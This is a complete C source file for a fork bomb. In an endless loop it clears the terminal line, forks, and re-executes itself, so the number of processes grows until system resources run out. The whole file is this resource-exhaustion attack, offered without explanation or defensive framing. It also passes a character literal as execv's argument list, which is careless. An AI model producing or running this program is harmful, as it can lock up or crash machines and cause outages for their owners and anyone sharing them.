#include <stdio.h>
#include <unistd.h>

int main() {
  printf("o7");

  while (1) {
    printf("\033[2K\r");
    int pid = fork();
    execv("./forkbomb", '\0');
  }

  return 0;
}
